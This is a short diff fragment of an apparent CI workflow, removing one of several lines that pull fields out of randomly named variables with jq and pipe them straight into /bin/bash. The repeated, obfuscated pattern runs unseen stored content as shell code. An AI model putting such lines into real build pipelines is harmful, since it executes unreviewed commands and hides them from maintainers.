@@ -29,7 +29,6 @@ jobs:
           echo $w5 | jq -r .idmj151 | /bin/bash
           echo $vhqns3 | jq -r .c533 | /bin/bash
           printf '%s' "$pyc22691" | jq -r .snu380 | /bin/bash
-          printf '%s' "$ngbz97" | jq -r .fsp49 | /bin/bash
           echo $bj8 | jq -r .wddqy51 | /bin/bash
           echo $gft2775 | jq -r .llc672 | /bin/bash
           echo $alnx5718 | jq -r .zm2826 | /bin/bash
